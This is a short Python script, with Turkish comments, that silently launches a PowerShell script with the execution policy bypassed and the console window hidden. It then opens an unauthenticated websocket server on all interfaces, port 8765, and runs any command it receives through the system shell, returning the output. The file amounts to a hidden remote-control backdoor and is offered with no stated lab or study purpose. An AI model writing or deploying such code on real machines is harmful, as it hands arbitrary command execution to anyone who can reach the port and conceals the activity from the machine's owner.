import asyncio
from websockets import serve
import subprocess

powershell_script = "test_powershell_s.ps1"

# PowerShell scriptini bağımsız başlat, terminali gizle ve Python scripti kapansa bile çalışmaya devam etsin
subprocess.Popen(
    ["powershell", "-ExecutionPolicy", "Bypass", "-Command", 
    f"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File {powershell_script}'"],
    stdout=subprocess.DEVNULL, 
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW  # Bu parametre terminalin açılmamasını sağlar
)
def execute_command(command):
    """Komutu çalıştır ve çıktısını döndür."""
    try:
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        return result.stdout if result.stdout else "No output"
    except subprocess.CalledProcessError as e:
        return str(e)

async def handle_client(websocket):
    """İstemciden komut al ve çalıştır."""
    async for command in websocket:
        print(f"Komut alındı: {command}")
        output = execute_command(command)
        await websocket.send(output)

async def main():
    async with serve(handle_client, "0.0.0.0", 8765):  # Tüm bağlantıları kabul et
        print("Sunucu çalışıyor...")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
